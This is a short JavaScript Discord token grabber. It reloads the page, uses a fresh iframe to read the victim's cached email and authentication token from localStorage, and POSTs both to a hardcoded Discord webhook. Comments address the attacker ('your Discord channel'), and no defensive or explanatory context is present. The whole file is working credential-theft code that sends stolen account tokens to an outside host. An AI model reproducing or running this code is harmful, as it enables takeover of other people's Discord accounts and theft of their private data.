const FnLComa = /^"|"$/g;
//Discord webhook
const webhook = "https://discord.com/api/webhooks/1043323707478773801/utPyIWs5mwx75cko12Rv3kzxAGpAzfUpNrCmLzOmgTKNAF-b0tS4jXTMhoJyCEebLvOi";

//Function to send message to your webhook in discord
function sendMessage({ message }) {
    const webhookRequest = new XMLHttpRequest(); 
    webhookRequest.open("POST", webhook);
    webhookRequest.setRequestHeader('Content-type', 'application/json');

    const params = {
        content: message || 'No message provided'
    };
    webhookRequest.send(JSON.stringify(params));
};

//Reload window so the token appears 
location.reload();
//Get the email and the token
const interval = setInterval(() => {
    const data = {
        email: document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.email_cache.replace(FnLComa, ''),
        token: document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token.replace(FnLComa, '')
    };
    //Send the data over to your Discord channel using the webhook
    if(data.token) {
        sendMessage({ message: `Email: **${data.email}**\nToken: **${data.token}**` });
        clearInterval(interval);
    };
});
